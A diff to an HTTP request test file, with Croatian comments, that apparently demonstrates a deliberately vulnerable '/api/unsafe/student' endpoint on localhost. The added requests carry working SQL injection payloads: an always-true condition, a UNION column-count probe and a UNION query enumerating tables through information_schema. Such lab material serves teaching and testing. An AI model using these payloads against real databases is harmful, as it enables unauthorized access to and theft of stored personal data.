@@ -15,3 +15,38 @@ POST http://localhost:4321/api/safe/student
 Content-Type: application/x-www-form-urlencoded
 
 jmbag=netocanJmbag
+
+### /api/unsafe/student (provjera ako radi s tocnim JMBAG-om)
+### Ocekivani odgovor: 200 OK
+POST http://localhost:4321/api/unsafe/student 
+Content-Type: application/x-www-form-urlencoded
+
+jmbag=0246801234
+
+### /api/unsafe/student (provjera ako radi s sql injection)
+### Ocekivani odgovor: 200 OK
+POST http://localhost:4321/api/unsafe/student
+Content-Type: application/x-www-form-urlencoded
+
+jmbag=' OR '1'='1
+
+### SQL Injection - Union attack (Sad znam strukturu tablice)
+### Ocekivani odgovor: 200 OK
+### pocet recimo samo s 1 pa svaki put dodat jos jedan
+POST http://localhost:4321/api/unsafe/student
+Content-Type: application/x-www-form-urlencoded
+
+jmbag=' UNION SELECT 1,2,3,4,5,6,7,8,9 #
+
+### SQL Injection - Union attack (Sad znam imena svih tablica)
+### Ocekivani odgovor: 200 OK
+### primjetiti da svejedno treba imati 9 kolona, zato postoje dummy kolone 
+### (nekaj, nasumicno, info@db.com...)
+POST http://localhost:4321/api/unsafe/student
+Content-Type: application/x-www-form-urlencoded
+
+jmbag=' UNION SELECT CONCAT('TABLICA-',table_name), table_schema, 'nekaj', 
+'nasumicno', 'info@db.com', '+385-99-999', 2024, 'redovan', 1 
+FROM information_schema.tables WHERE table_schema=database() #
+
+
